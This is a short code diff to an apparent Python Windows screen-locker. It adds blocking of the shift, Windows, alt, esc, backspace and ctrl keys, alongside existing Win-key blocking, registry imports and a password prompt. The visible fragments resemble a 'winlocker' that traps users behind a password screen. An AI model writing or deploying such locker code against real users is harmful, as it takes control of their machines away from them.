@@ -3,6 +3,13 @@ from subprocess import Popen as cmd
 import ctypes
 import winreg
 import sys
+import keyboard # type: ignore
+
+block = [
+"shift", "windows", "alt", "esc", "backspace", "ctrl"]
+
+for key in block:
+    keyboard.block_key(key)
 
 # Функция для блокировки клавиш Win
 def block_win_key():
@@ -98,3 +105,4 @@ password.pack()
 password.bind("<Return>", CheckPassword)
 
 root.mainloop()
+
